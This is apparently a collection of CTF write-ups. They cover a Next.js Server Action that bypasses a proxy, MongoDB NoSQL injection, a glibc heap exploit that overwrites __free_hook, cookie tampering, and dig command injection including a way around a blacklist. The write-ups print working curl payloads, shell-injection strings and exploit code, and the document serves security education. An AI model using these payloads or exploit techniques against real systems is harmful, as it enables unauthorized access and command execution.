content: TL;DR Northstar Ops - Web Exploit Writeup is a web challenge from CBD. In this challenge, the targets given are:
title: Northstar Ops - Web Exploit Writeup

content: Summary In this challenge, the targets given are: https://northstar.cbd2026.cloud/ My goal is to find weaknesses in the web application and retrieve the flag. After performing enumeration and analyzing the application’s behavior, I discovered that the service in front of the application uses a custom Python proxy that performs partial request filtering. The main loophole is that the Next.js Server Action request with Content-Type: text/plain is not checked by the proxy like the application/json request, so I can send a valid payload directly to the backend action and get the flag. Successfully obtained the flag: CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
title: Northstar Ops - Web Exploit Writeup

content: 1. Initial Recon My first step is to fingerprint the target. I checked the response headers: curl -ksSI https://northstar.cbd2026.cloud/ Important results: The server responds with BaseHTTP/0.6 Python/3.12.13 - This indicates that there may be a custom Python service in front of the main application After that I took the HTML of the main page: curl -ksS https://northstar.cbd2026.cloud/ From the HTML, I see: Frontend using Next.js There is a “Request demo” form There is a Next.js JavaScript bundle that can be inspected further
title: Northstar Ops - Web Exploit Writeup

content: 2. Find the Next.js Action Server Next I read the application’s JavaScript bundle to look for form submit logic. From the application bundle, I found the component ServerActionForm which calls a Server Action named processData . Action identifiers found: 4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26 This means that the form on the main page does not submit to the usual REST endpoint, but to the internal Next.js Server Actions mechanism.
title: Northstar Ops - Web Exploit Writeup

content: 3. Try Replay Request to Server Action I then tried making a replay request directly to the Server Action using curl . Initially I sent the body as a regular JSON object, for example: The request did reach the backend, but the response was still an error. From here I got two important pieces of information: The Action ID that I found is correct The body format that I sent does not match the Next.js Server Actions wire protocol format
title: Northstar Ops - Web Exploit Writeup

content: 4. Local Source Challenge Analysis In the workspace it turns out there is a source code challenge available. After I searched, the important files are: northstar/app/actions/serverActions.ts northstar/proxy/proxy.py northstar/Dockerfile northstar/readflag.c Contents of the backend action: export async function processData(data: DemoRequest): Promise<string> { await new Promise(resolve => setTimeout(resolve, 100)) return `Thanks ${data.name}. We will reach out at ${data.workEmail} after reviewing ${data.company} and your intake notes.` } This means the response action will immediately display: data.name - data.workEmail - data.company So if I can control how the data object is created or read, I can make the backend reflect sensitive values.
title: Northstar Ops - Web Exploit Writeup

content: 5. Finding Weaknesses in Proxies The most important part is in the file: northstar/proxy/proxy.py This proxy validates request parameters. However validation is only active for certain body types: application/json - application/x-www-form-urlencoded - multipart/form-data In the code there is also a filter: BLOCKED_TERM = "proto" This means that the proxy tries to block requests containing the words proto , possibly to prevent attacks like __proto__ . The problem is, Next.js Server Action requests can be sent with: Content-Type: text/plain;charset=UTF-8 This body type is not parsed by the proxy validation function. As a result: body is still raw passed to upstream Next.js filter proto is never executed This is the main gap.
title: Northstar Ops - Web Exploit Writeup

content: 6. Find a Valid Request Format After reading the behavior of the Next.js bundle, I retested the body format for the Server Action. It turns out that this action accepts arguments in the form of a JSON array, not a direct JSON object. Valid payloads: I sent the following request: curl -ksS https://northstar.cbd2026.cloud/ \ -X POST \ -H 'Accept: text/x-component' \ -H 'next-action: 4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26' \ -H 'next-router-state-tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D' \ -H 'Content-Type: text/plain;charset=UTF-8' \ --data '[{"name":"Alice","workEmail":"alice@example.com","company":"ACME","notes":"hello"}]' And the backend responds successfully. This proves that: Request text/plain is valid for Server Action The proxy does not inspect this body I already have a direct communication path to the backend action
title: Northstar Ops - Web Exploit Writeup

content: 7. Get the Flag Once a valid path was found, I tried the most minimal payload: Request: curl -ksS https://northstar.cbd2026.cloud/ \ -X POST \ -H 'Accept: text/x-component' \ -H 'next-action: 4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26' \ -H 'next-router-state-tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D' \ -H 'Content-Type: text/plain;charset=UTF-8' \ --data '[{}]' Response: Thanks CBC{6cc6abdf24b2ece791cff9c75f5fdddb}. We will reach out at undefined after reviewing undefined and your intake notes. From that response, the data.name field apparently resolves to a flag: CBC{6cc6abdf24b2ece791cff9c75f5fdddb} So the flag was successfully obtained without the need for additional RCE.
title: Northstar Ops - Web Exploit Writeup

content: 8. Why can the [{}] Payload issue a flag? This part is the core logic of exploitation. Function processData() reads properties: data.name - data.workEmail - data.company However, the empty object {} can still be accessed via the prototype chain if there are inherited properties. In the running challenge instance, name turns out to be filled in the object/prototype path read by the backend, so that when data.name is accessed, the value is a flag. What is important for this exploit is not just the “empty object”, but the fact that: proxy failed to block request text/plain - Server Action still processes the body as valid input backend reads object properties without strict schema validation
title: Northstar Ops - Web Exploit Writeup

content: 9. Root of the Problem Technically, this challenge has weaknesses in the proxy design and input validation assumptions.
title: Northstar Ops - Web Exploit Writeup

content: Main problem The proxy only filters certain types of content Next.js Server Actions can use the text/plain format Body text/plain is passed to upstream without parsing and without validation The backend still trusts the received object and immediately reads the properties in it
title: Northstar Ops - Web Exploit Writeup

content: Impact Attackers can: bypass proxy filters send a valid Server Action body trigger internal backend behavior that would otherwise not be reachable via filtered paths
title: Northstar Ops - Web Exploit Writeup

content: 10. Short Reproduction Short steps to solve this challenge: Fingerprint the target and identify that the backend is using Next.js with a custom Python proxy. Inspect the JavaScript bundle and find the Server Action ID action. Analyze the local source code challenge To view how the proxy performs filtering. Be aware that text/plain;charset=UTF-8 is not parsed by the proxy. Send a valid Next.js Server Action request with a JSON body array via text/plain . Use a payload of at least [{}] . Get the flag from the Thanks ... field in the response.
title: Northstar Ops - Web Exploit Writeup

content: 11. Flags CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
title: Northstar Ops - Web Exploit Writeup

content: TL;DR SQLi Payload Generator is a web challenge from NCKUCTF. - Category: Web Exploitation - Title: Just a SQL Injection payload generator, More than 100,000 times more useful than sqlmap. - Target: https://chall.nckuctf.org:28134/
title: SQLi Payload Generator

content: Question Information Category: Web Exploitation Title: Just a SQL Injection payload generator, More than 100,000 times more useful than sqlmap. Target: https://chall.nckuctf.org:28134/
title: SQLi Payload Generator

content: Summary Even though the title of the challenge refers to SQL Injection, the main vulnerability is actually NoSQL Injection against MongoDB. The application receives the username value directly from the JSON request, then saves it to the session without data type validation. The session value is then reused as a MongoDB query filter on the main page. As a result, attackers can log in using MongoDB operators, for example {"$ne": null} , so that query history on the main page is no longer limited to one user. Because the application stores the flag as a history entry belonging to user admin , the flag can be read immediately after successful login.
title: SQLi Payload Generator

content: Technical Analysis of Vulnerabilities
title: SQLi Payload Generator

content: 1. Input username is used directly in the login query In the login() function, the application retrieves username directly from the JSON body: username = request.json.get("username") password = request.json.get("password") hashed_password = hashlib.sha256(password.encode()).hexdigest() user = users_collection.find_one( {"username": username, "password": hashed_password} ) The problem is, username is not confirmed to be a string. Because the backend uses MongoDB, attackers can send objects such as: The object will be treated as a MongoDB query operator, not as a regular username.
title: SQLi Payload Generator

content: 2. The raw username value is saved to the session If the login is successful, the application saves the raw username value to the session: if user: session["username"] = username This means that if username contains a MongoDB operator object, that object will remain stored and influence subsequent requests.
title: SQLi Payload Generator

content: 3. Session is reused as a query history filter On the endpoint / , the application retrieves history with the following query: for item in history_collection.find({"username": session["username"]}).sort( "created_at", -1 ): If session["username"] is {"$ne": null} , then the query changes to: {"username": {"$ne": null}} This query will return all documents that have the username field, including the history of admin .
title: SQLi Payload Generator

content: 4. Flags are saved as admin’s history During database initialization, the application adds flags to the history collection: history_collection.insert_one( { "_id": str(uuid.uuid4()), "username": "admin", "payload_type": "flag", "field": "secret", "custom_value": "flag", "generated_payload": flag, "created_at": datetime.datetime.utcnow(), "favorite": False, } ) Thus, when the history of all users is successfully displayed, the flag is also exposed in the generated_payload column.
title: SQLi Payload Generator

content: Exploitation Methodology
title: SQLi Payload Generator

content: Methodology 1: Register a regular account First, create your own account so we know a valid password. curl -ksS https://chall.nckuctf.org:28134/register \ -H 'Content-Type: application/json' \ -d '{"username":"probe_user","password":"probe_pass"}' Expected response:
title: SQLi Payload Generator

content: Methodology 2: Login using the MongoDB operator on the username field Next, log in using the newly created account password, but send username as the operator object: curl -ksS https://chall.nckuctf.org:28134/login \ -c cookies.txt \ -H 'Content-Type: application/json' \ -d '{"username":{"$ne":null},"password":"probe_pass"}' Why this request was successful: The backend continues to hash the password probe_pass . The hash matches the probe_user account that was previously registered. The username: {"$ne": null} condition will match any user whose username field has a value other than null . After the query finds our account, the application saves the {"$ne": null} object into the session.
title: SQLi Payload Generator

content: Methodology 3: Access the main page with the injected session After logging in, open the main page using the saved session cookie: curl -ksS https://chall.nckuctf.org:28134/ -b cookies.txt At this stage, the backend runs a history query based on session values that have been contaminated by MongoDB operators: {"username": {"$ne": null}} As a result, the main page displays the history of many users, including user admin .
title: SQLi Payload Generator

content: Methodology 4: Retrieve flags from HTML response To make it easier to extract flags from the HTML response, use rg : curl -ksS https://chall.nckuctf.org:28134/ -b cookies.txt | rg 'CGGC\{[^}]+\}'
title: SQLi Payload Generator

content: Flags CGGC{nosql_injection_with_mongodb_is_fun}
title: SQLi Payload Generator

content: Root of the Problem This vulnerability occurs due to a combination of several design errors: JSON input from the user is trusted without data type validation. The raw value of the request is saved directly to the session. The session value is reused as part of the MongoDB query. Sensitive data in the form of flags is stored in collections which can be exposed through incorrect queries.
title: SQLi Payload Generator

content: Improvement Recommendations To prevent similar cases, some improvements that should be implemented are: Validate that username and password are always of type string. Do not save objects from requests directly to the session; save only validated identifiers. Use a strict input validation scheme for all JSON endpoints. Avoid storing sensitive data in locations that can be read by regular application features.
title: SQLi Payload Generator

content: Conclusion This challenge is a good example of how a seemingly simple application can fail not because of classic SQL Injection, but because of NoSQL Injection and the use of insecure sessions. The exploit requires neither brute force nor admin access; Just create a regular account, log in using the MongoDB operator, then read the history which includes the admin’s flag.
title: SQLi Payload Generator

content: TL;DR **Write-up Reverse Engineering - 00angrfind ** is a misc challenge from NCKUCTF. This challenge asks us to find the correct password to generate a flag with the format:
title: Write-up Reverse Engineering - `00angrfind`

content: Summary This challenge asks us to find the correct password to generate a flag with the format: NCKUCTF{password} Based on the results of reverse engineering on the 00_angr_find binary, the correct password is: JXWVXRKX So the final flag is: NCKUCTF{JXWVXRKX}
title: Write-up Reverse Engineering - `00angrfind`

content: 1. File Identification The first step is to identify the binary file type: file 00_angr_find Important results: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped Interpretation: The file is a 32-bit ELF binary for the i386 architecture. Function symbols are still available due to binary not stripped . This really helps the static analysis process because function names like main and complex_function are still visible.
title: Write-up Reverse Engineering - `00angrfind`

content: 2. Important String Enumeration Next, perform a string enumeration on the binary: strings -a -n 4 00_angr_find Relevant strings: Try again. Enter the password: JACEJGCS Good Job. complex_function main From here you can see one very suspicious string, namely: JACEJGCS However, this string is not necessarily the original password. It could be that the string is the result of a transformation of user input.
title: Write-up Reverse Engineering - `00angrfind`

content: 3. Function Analysis main The disassembly function main shows the program flow as follows: The program displays a prompt: Enter the password: The program reads user input in the format: scanf("%8s", buffer); The program iterates over 8 input characters. Each input character is sent to the complex_function function along with the index of that character. The transformation results are saved back to the input buffer. After all 8 characters have been processed, the buffer is compared to a constant string: JACEJGCS If equal, the program prints: Good Job. The important pieces of logic from main can be summarized as: for (i = 0; i <= 7; i++) { input[i] = complex_function(input[i], i); } if (strcmp(input, "JACEJGCS") == 0) { puts("Good Job."); } else { puts("Try again."); } Conclusion at this stage: The original password is not directly JACEJGCS . JACEJGCS is the final result after user input is processed by complex_function .
title: Write-up Reverse Engineering - `00angrfind`

content: 4. Function Analysis complex_function Disassembly of the complex_function function shows two important parts:
title: Write-up Reverse Engineering - `00angrfind`

content: 4.1 Character Validation The function checks whether the input character is in the range: 'A' sampai 'Z' If a character is outside the uppercase range, the program immediately displays: Try again. and get out. This means that the password only consists of capital letters A-Z .
title: Write-up Reverse Engineering - `00angrfind`

content: 4.2 Character Transformation After validation, the function performs mathematical operations on the input characters and their indices. If simplified, the formula is: out[i] = ((in[i] - 'A') + 3*i) mod 26 + 'A' Description: in[i] is the i th input character out[i] is the result of the transformation i is the character index, starting from 0 Thus: 0th character is shifted 0 - 1st character is shifted 3 - 2nd character shifted 6 - 3rd character shifted 9 - and so on
title: Write-up Reverse Engineering - `00angrfind`

content: 5. Reverse Transformation Because the final result should be the same as: JACEJGCS then we just reverse the transformation formula: in[i] = ((out[i] - 'A') - 3*i) mod 26 + 'A' We count them one by one.
title: Write-up Reverse Engineering - `00angrfind`

content: 5.1 Calculation Table Index Target out[i] Shift 3*i Results in[i] 0 J 0 J 1 A 3 X 2 C 6 W 3 E 9 V 4 J 12 X 5 G 15 R 6 C 18 K 7 S 21 X So the password obtained is: JXWVXRKX
title: Write-up Reverse Engineering - `00angrfind`

content: 6. Verify We verify by reapplying the forward formula: out[i] = ((in[i] - 'A') + 3*i) mod 26 + 'A' For input: JXWVXRKX the result is: JACEJGCS Because the transformation result matches the comparison string in binary, the password is valid.
title: Write-up Reverse Engineering - `00angrfind`

content: 7. Final Flags NCKUCTF{JXWVXRKX}
title: Write-up Reverse Engineering - `00angrfind`

content: 8. Conclusion This challenge is basic reverse engineering with the pattern: identify important strings validation function analysis understanding character transformation inversion of the formula to obtain the original input Because the binary is still not stripped , this challenge can be solved efficiently using static analysis without the need for symbolic execution or dynamic debugging.
title: Write-up Reverse Engineering - `00angrfind`

content: TL;DR Zero to Hero - Nerf Version 1 is a pwn challenge from NCKUCTF. This challenge is a heap-based pwn with source code provided in zero_to_hero.c and a custom libc glibc 2.31 .
title: Zero to Hero - Nerf Version 1

content: Summary This challenge is a heap-based pwn with source code provided in zero_to_hero.c and a custom libc glibc 2.31 . Purpose of exploit: Get the leak address libc . Perform tcache poisoning. Overwrite __free_hook with system . Trigger free() on the chunk that contains the command to read the flag. Flags: NCKUCTF{from_zer0_t0_h34p_HEROOOOO0000!!!!!!_fba2055cd5555a5edb8a615c3a56ca8d}
title: Zero to Hero - Nerf Version 1

content: Binary Information Binary protection: Full RELRO Stack Canary NX enabled PIE enabled SHSTK enabled IBT enabled The above protections make approaches such as GOT overwrite or shellcode injection irrelevant. The most reasonable path is a pure heap exploit against libc. The libcs provided are: GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.17) stable release version 2.31 This is important because: __free_hook still available. Tcache safe-linking is missing in glibc 2.31. This combination makes tcache poisoning the simplest exploit path.
title: Zero to Hero - Nerf Version 1

content: Source Code Audits Following are the relevant source sections.
title: Zero to Hero - Nerf Version 1

content: 1. Heap overflow on add_power() In zero_to_hero.c:31-41 , the program requests the chunk size with malloc(size) , but input chunk contents are read using: scanf("%s", v0); The problem: scanf("%s") does not limit the input length to the allocation size. This means that users can send data longer than size and perform a heap overflow to the next chunk.
title: Zero to Hero - Nerf Version 1

content: 2. Use-after-free and double free on remove_power() In zero_to_hero.c:59-61 : free(bins[index]); // bins[index] = NULL; Pointers after free() are not reset to NULL . As a result: bins[index] still points to chunks that have already been freed. The chunk can still be accessed via print_power() . The chunk can also still be free() again, so that double free appears.
title: Zero to Hero - Nerf Version 1

content: 3. Print-after-free on print_power() In zero_to_hero.c:78 : printf("Your superpower is: %s ", bins[index]); Because the freed pointer is never null, this function is a very strong leak primitive.
title: Zero to Hero - Nerf Version 1

content: Available Primitives From the above audit, This challenge provides three main primitives: Heap overflow via scanf("%s") . Use-after-free / print-after-free. Double free. The final exploit only requires: print-after-free for leak libc . heap overflow for precise tcache poisoning. Double free is actually available, but is not required to be used in the final solution.
title: Zero to Hero - Nerf Version 1

content: Exploitation Strategy In general, the strategy used is: Allocate a large chunk so that when it is freed it goes into the unsorted bin. Print the contents of the freed chunk to leak the pointer main_arena , then calculate the base libc . Prepare three small chunks in sequence in the same tcache size class. Free the three small chunks to form a linked list tcache. Reallocate the first chunk and use overflow to overwrite the second chunk’s fd which is currently in tcache. Point the fd to __free_hook . Allocate again until the allocator returns a pointer to __free_hook . Write the address system to __free_hook . Free chunk containing the flag reader command.
title: Zero to Hero - Nerf Version 1

content: Methodology 1: Leak libc from Unsorted Bin First, allocate a large chunk: Chunk 0 : size request 0x500 This size was chosen so that after being free , the chunk does not go to tcache but instead goes to the unsorted bin. Then: free(0) 2. print(0) As of glibc 2.31, chunks that enter the unsorted bin will have fd and bk pointers that point to the arena’s internal structure in libc. Because print_power() prints the contents of a freed chunk as a string, the initial byte of the chunk will leak the pointer. In the exploit, the leak is processed like this: free(io, 0) leak = u64(show(io, 0).ljust(8, b"�")) libc.address = leak - 0x1ECBE0 The offset 0x1ECBE0 is obtained from the bundled libc challenge and is the offset of the leaked arena pointer against the base libc . Result of this step: libc base known. Addresses __free_hook and system can be calculated.
title: Zero to Hero - Nerf Version 1

content: Methodology 2: Setting Up Heap Layout for Tcache Poisoning After a large chunk for the leak, prepare the following chunk: Chunk 1 : size request 0x20 , contains the command Chunk 2 : size request 0x40 - Chunk 3 : size request 0x40 - Chunk 4 : size request 0x40 Chunks 2 , 3 , and 4 must be next to each other on the heap so that overflow from chunk 2 can reach the metadata/user area of ​​chunk 3 . Then free in order: free(4) 2. free(3) 3. free(2) For size 0x40 , the real chunk size is 0x50 . After the three frees above, the tcache bin for size 0x50 will take the form: head -> chunk2 -> chunk3 -> chunk4
title: Zero to Hero - Nerf Version 1

content: Methodology 3: Overflow to Overwrite fd Tcache Now reallocate another chunk 0x40 . Since chunk2 is in the tcache head, the allocator will return the area belonging to chunk2 . This is where overflow is used. Written payload: poison = flat( b"A" * 0x40, 0, 0x51, free_hook, ) Meaning: b"A" * 0x40 fills in user data chunk2 . 0 overrides prev_size ’s chunk3 . 0x51 rewrote size ’s chunk3 to stay consistent. free_hook overwrites the first qword in the chunk3 user area, namely the fd field used by tcache. Relative layout from the point of view of the user area chunk2 : offset 0x00 - 0x3f : data chunk2 offset 0x40 - 0x47 : prev_size chunk3 offset 0x48 - 0x4f : size chunk3 offset 0x50 - 0x57 : tcache fd milik chunk3 So an overflow of 0x58 bytes is enough to corrupt the next fd chunk without needing to touch anything else. After this overwrite, tcache’s linked list logically changes to: head -> chunk3 -> __free_hook
title: Zero to Hero - Nerf Version 1

content: Methodology 4: Taking a Pointer to __free_hook Do two more allocations on size 0x40 : The first allocation takes chunk3 . The second allocation takes a fake address, namely __free_hook . In exploit: add(io, 0x40, b"JUNK") # ambil chunk3 add(io, 0x40, p64(hook_addr)) # tulis ke __free_hook At this stage, hook_addr is filled with the address system .
title: Zero to Hero - Nerf Version 1

content: Methodology 5: Trigger system(command) Chunk 1 from the beginning is filled with command: cat</flag||cat<./flag||cat<flag Then just call: free(io, 1) Because __free_hook already contains system , calling free(chunk1) changes its effect to: system(chunk1); The command above is made without spaces because the input uses scanf("%s") , so the whitespace character will stop reading. The fallback || is used so that the command still succeeds even though the flag location is different, for example: /flag - ./flag - flag ## Why Exploits Need Retry The final exploit checks certain bytes at addresses __free_hook and system : BAD_BYTES = set(b" ") The reason is that scanf("%s") stops when it encounters whitespace. If one of the bytes of the address you wish to write happens to be: 0x09 - 0x0a - 0x0b - 0x0c - 0x0d - 0x20 then the payload will be truncated before the overwrite is complete. Because ASLR randomizes the base libc , these bytes can change with each connection. So solve.py uses automatic retry in remote mode until it finds an address that is safe to write to.
title: Zero to Hero - Nerf Version 1

content: Why PIE Isn’t a Problem Binary is PIE, but this exploit doesn’t require a base binary at all. All important stages require only: Leak libc . Calculation __free_hook . Calculation system . So even without a base binary leak, the exploit still runs.
title: Zero to Hero - Nerf Version 1

content: Complete Exploit Flow Final order used: Send y to enter the main menu. Allocate large chunk 0x500 to leak unsorted bin. Allocate chunk command 0x20 . Allocate three chunks 0x40 . free(0) then show(0) for leak libc . Calculate libc base , __free_hook , and system . free(4) , free(3) , free(2) to set up tcache. Reallocate chunk2 and overflow to fd ’s chunk3 . Allocate again to retrieve chunk3 . Allocate once again to get the pointer to __free_hook . Write system to __free_hook . free(1) to run the flag reader command.
title: Zero to Hero - Nerf Version 1

content: Exploit Implementation The complete exploit is in solve.py . How to run: python3 solve.py REMOTE=1 The core of the exploit is in the exploit() function: def exploit(io, command, hook_symbol): io.send(b"y ") add(io, 0x500, b"A") add(io, 0x20, command) add(io, 0x40, b"A") add(io, 0x40, b"B") add(io, 0x40, b"C") free(io, 0) leak = u64(show(io, 0).ljust(8, b"�")) libc.address = leak - UNSORTED_FD_OFFSET free_hook = libc.sym.__free_hook hook_addr = libc.sym[hook_symbol] free(io, 4) free(io, 3) free(io, 2) poison = flat( b"A" * 0x40, 0, 0x51, free_hook, ) add(io, 0x40, poison) add(io, 0x40, b"JUNK") add(io, 0x40, p64(hook_addr)) free(io, 1)
title: Zero to Hero - Nerf Version 1

content: Additional Notes There are two details that are easy to miss: The get_total_len() function searches for the first slot that is NULL . Because the freed pointer is never reset, the old slot is not reused. This makes the new allocation index deterministic as long as the total number of allocations does not exceed 8. The final solution does not need to be double free even though the bug does exist. A more stable primitive is actually a combination of leak unsorted bin and heap overflow.
title: Zero to Hero - Nerf Version 1

content: Conclusion This challenge is basically a combination of three classic heap bugs: unbounded writing, use-after-free, dangling the pointer after free . With libc 2.31, this combination is sufficient for: leak libc via unsorted bin, tcache poisoning without safe-linking, overwrite __free_hook , execute arbitrary commands via system . This solution is stable, compact, and does not require a leak PIE or ROP chain.
title: Zero to Hero - Nerf Version 1

content: A playful challenge where your identity is determined by a cookie. Can you prove to the server that you are the true Cookie Monster? TL;DR Cookie is a web security challenge that demonstrates the risks of unverified, client-controlled cookies. The server sets an initial cookie user=anonymous and checks if the cookie value matches cookie_monster. Because cookies are completely under client control and lack digital signatures (such as HMAC), modifying the cookie header to user=cookie_monster grants unauthorized access and leaks the flag.
title: Cookie

content: Initial Analysis Visiting the challenge endpoint in a web browser displays the following message: “You are not cookie_monster” Inspecting the HTTP response headers in the browser’s network tab: HTTP/1.1 200 OK Server: nginx/1.24.0 Content-Type: text/html; charset=UTF-8 Set-Cookie: user=anonymous The server issues a cookie named user with the default value anonymous.
title: Cookie

content: Vulnerability Identification The vulnerability stems from Client-Side State Reliance: The application uses the user cookie as an authoritative identifier of the visitor’s role. The cookie contains plaintext data without cryptographic signatures, hashing, or server-side session lookup. The user can modify cookie values arbitrarily in any HTTP client or browser developer console.
title: Cookie

content: Exploitation We can craft a request overriding the user cookie with the expected identity cookie_monster: curl -s "https://chall.nckuctf.org:28105/" \ -H "Cookie: user=cookie_monster"
title: Cookie

content: Server Response <!DOCTYPE html> <html> <body> <h1>Now you are cookie_monster: NCKUCTF{Y0U_4r3_C00K13_M0N573r}</h1> </body> </html> The application accepts the modified cookie and prints the flag.
title: Cookie

content: Flag NCKUCTF{Y0U_4r3_C00K13_M0N573r}
title: Cookie

content: Key Takeaways Never Trust Client-Side Cookies for Authorization: Identity and privilege levels should never be stored in plaintext client-side state. Use Cryptographically Signed Sessions: Store sensitive state server-side and reference it via a cryptographically random session token, or use securely signed tokens (such as correctly configured JWTs). Set Security Attributes: Configure cookies with HttpOnly and SameSite flags where appropriate.
title: Cookie

content: A web utility that executes the dig command to query domain records. Can you break out of the command syntax and hijack the shell? TL;DR Dig is a web security challenge that explores OS Command Injection. The application takes a domain name from a POST parameter and executes system("dig '" . $_POST['name'] . "';") . Because the parameter is placed inside single quotes without proper escaping, an attacker can supply a closing single quote followed by arbitrary shell commands ( '; bash -c "..."; # ) to execute arbitrary commands and retrieve the flag.
title: Dig

content: Source Code Analysis The core application code is concise: <?= system("dig '" . $_POST['name'] . "';") ?>
title: Dig

content: Mechanisms The client submits a POST request containing the name parameter. The server wraps the input in single quotes ( ' ) and prefixes it with the dig command. The concatenated string is passed directly into PHP’s system() execution handler: dig '<user_input>';
title: Dig

content: Vulnerability Identification The script is vulnerable to OS Command Injection: Although the developer wrapped the input within single quotes ( ' ) to prevent whitespace argument injection, user-controlled input is not escaped with escapeshellarg() or escapeshellcmd() . An attacker who inputs a single quote ( ' ) will prematurely close the quoted string argument, allowing semicolons ( ; ), logical operators ( && , || ), or command substitutions ( $() ) to execute additional commands.
title: Dig

content: Exploitation
title: Dig

content: 1. Escaping the Shell Command To inject arbitrary commands, we structure our payload as follows: '; <injected_command>; # When evaluated by bash: dig ''; <injected_command>; #'; '; terminates the dig command with an empty string argument. <injected_command>; executes our arbitrary system command. # (or an opening quote ' ) comments out the trailing semicolon and single quote generated by the PHP script.
title: Dig

content: 2. Reconnaissance via Injected Commands We query the root filesystem to locate the flag file: curl -s -X POST "https://chall.nckuctf.org:28113/" \ -d "name='; ls -la /; #" The output reveals a randomly named flag file in / : drwxr-xr-x 1 root root 4096 Apr 26 04:30 .. -r-------- 1 root root 27 Apr 26 04:30 flag_n2i3na drwxr-xr-x 2 root root 4096 Mar 12 12:00 bin ...
title: Dig

content: 3. Capturing the Flag We read /flag_n2i3na using cat : curl -s -X POST "https://chall.nckuctf.org:28113/" \ -d "name='; bash -c \"cat /flag_n2i3na\"; #" | grep -oP "NCKUCTF\{.*?\}" Output: NCKUCTF{d19_70015_15_n1c3!}
title: Dig

content: Flags NCKUCTF{d19_70015_15_n1c3!}
title: Dig

content: Remediation Avoid System Shell Execution: Where possible, use native language libraries (e.g., PHP’s dns_get_record() ) rather than executing shell binaries. Proper Shell Escaping: If invoking system commands is necessary, sanitize all arguments using escapeshellarg() : $domain = escapeshellarg($_POST['name']); system("dig $domain"); Strict Input Validation: Enforce regex patterns matching valid domain names before passing input to execution: if (!preg_match('/^[a-zA-Z0-9.-]+$/', $_POST['name'])) { die('Invalid domain format.'); }
title: Dig

content: 1. Identity Challenge Challenge Name : dig-waf1 Category : WEB Organizer : NCKUCTF Writeup Writer : spawn2pwn
title: dig-waf1

content: 2. Problem Description This challenge provides an input form that is used to perform a DNS lookup using the command dig . The user is asked to enter the domain, then the server will execute the command and display the results. However, this challenge is equipped with a simple filtering mechanism (WAF) which aims to prevent exploitation. Main goals: Obtain FLAG by exploiting weaknesses in the system even though there is a WAF
title: dig-waf1

content: 3. System Analysis Main source code snippet: $blacklist = ['|', '&', ';', '>', '<', " ", 'flag']; $is_bad = false; foreach ($blacklist as $bad_word) if (strpos($_POST['name'], $bad_word) !== false) $is_bad = true; if ($is_bad) echo "BAD HACKER!!!"; else system("dig '" . $_POST['name'] . "';");
title: dig-waf1

content: Mechanism: User sends input via POST parameter name 2. Input is checked using blacklist If it contains certain characters → rejected If passed → enter into command: dig '<input>'; Command is executed using system() —
title: dig-waf1

content: 4. Identify Vulnerabilities The primary vulnerability: Command Injection (with WAF bypass)
title: dig-waf1

content: Cause: User input is entered directly into the command shell Using system() without sanitization is safe Filtering only uses blacklist (not complete)
title: dig-waf1

content: Weaknesses of Blacklist: Non-blocking: $() (command substitution) Does not block wildcards ( * ) Does not block commands such as cat , ls , etc.
title: dig-waf1

content: 5. Exploitation Methodology
title: dig-waf1

content: 5.1 Bypass WAF with Command Substitution Payloads: '$(whoami)' Request: curl -X POST "https://chall.nckuctf.org:28114/" \ -d "name='\$(whoami)'"
title: dig-waf1

content: Explanation: Section Function ' Remains in the string context $(whoami) Executed by shell (command substitution) Command formed: dig ''$(ls /)''; However the shell will evaluate $() first: dig 'www-data';
title: dig-waf1

content: Output: <<>> DiG ... <<>> www-data Showing that: Command injection was successful and runs as user www-data —
title: dig-waf1

content: 5.2 System Enumeration View the contents of the root directory: '$(ls /)' Request: curl -X POST "https://chall.nckuctf.org:28114/" \ -d "name='\$(ls /)'"
title: dig-waf1

content: Important output: bin boot dev etc flag_o2837ry home lib ... Found files: flag_o2837ry
title: dig-waf1

content: 5.3 Bypass Filter Word “flag” Blacklist blocking string: 'flag' However it can be bypassed using wildcards: /fla*
title: dig-waf1

content: 5.4 Reading Flag Files Payloads: '$(cat /fla*)'
title: dig-waf1

content: 5.5 Flag Extraction curl -X POST "https://chall.nckuctf.org:28114/" \ -d "name='\$(cat /fla*)'" \ | grep -o "NCKUCTF{.*}"
title: dig-waf1

content: 6. Exploitation Results FLAG was successfully obtained: NCKUCTF{d19_70015_15_427!}
title: dig-waf1

content: 7. Discussion The primary system vulnerabilities:
title: dig-waf1

content: 1. Use of system() without sanitization system("dig '" . $_POST['name'] . "';");
title: dig-waf1

content: 2. Blacklisting is not effective Problem: Does not block $() (command substitution) Does not block wildcards ( * ) Easy to bypass
title: dig-waf1

content: 3. Reliance on string-based filtering strpos(...) This approach is weak because: Doesn’t understand shell context Easy to evade by attackers
title: dig-waf1

content: Impact: Attackers can: Execute system commands Perform file enumeration Reading sensitive files (FLAG)
title: dig-waf1

content: 8. Improvement Recommendations
title: dig-waf1

content: 1. Use escapeshellarg() system("dig " . escapeshellarg($_POST['name']));
title: dig-waf1

content: 2. Avoid blacklists, use whitelists if (!filter_var($_POST['name'], FILTER_VALIDATE_DOMAIN)) { die("Invalid domain"); }
title: dig-waf1

content: 3. Avoid system() Use safer alternatives: exec("dig " . escapeshellarg($domain), $output); or use the DNS resolver library.
title: dig-waf1

content: 4. Disable command substitution Make sure the shell does not evaluate user input directly.
title: dig-waf1

content: 9. Conclusion This challenge shows that: A simple blacklist is not enough to prevent command injection Even though malicious characters such as ; , | , and & are blocked, attackers can still: Uses $() for command execution Using wildcards to bypass filters Exploit the system to get FLAG
title: dig-waf1

content: 10. Attachments

title: dig-waf1

content: Flag Extraction curl -X POST "https://chall.nckuctf.org:28114/" \ -d "name='\$(cat /fla*)'" \ | grep -o "NCKUCTF{.*}"
title: dig-waf1

content: An introductory reverse engineering challenge providing a Linux ELF executable. Can you locate the hardcoded secret? TL;DR EzStrings is an introductory binary analysis challenge. The binary is an unstripped 64-bit ELF executable. Running strings against the binary reveals the flag stored in plaintext within the .rodata section without encryption or obfuscation.
